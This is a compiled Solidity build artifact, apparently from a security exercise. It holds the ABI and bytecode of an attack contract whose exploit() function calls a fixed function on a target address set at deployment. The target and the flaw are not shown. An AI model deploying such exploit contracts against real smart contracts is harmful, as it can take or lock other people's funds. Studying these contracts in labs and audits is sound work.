{"abi":[{"type":"constructor","inputs":[{"name":"_targetAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"_target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516101633803806101638339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b031990921691909117905560ff806100646000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80632ac8bb1514603757806363d9b770146066575b600080fd5b603d606e565b6040805173ffffffffffffffffffffffffffffffffffffffff9092168252519081900360200190f35b606c608a565b005b60005473ffffffffffffffffffffffffffffffffffffffff1681565b6000632548ce3760e01b90506000546040516024810160405282815261010060048201526000806024836000865af19150508060c557600080fd5b505056fea26469706673582212201b47f00ecae100df741f38ad7e5c80119a0318b77296d941d22b721ab356b96164736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"_target()":"2ac8bb15","exploit()":"63d9b770"},"id":0}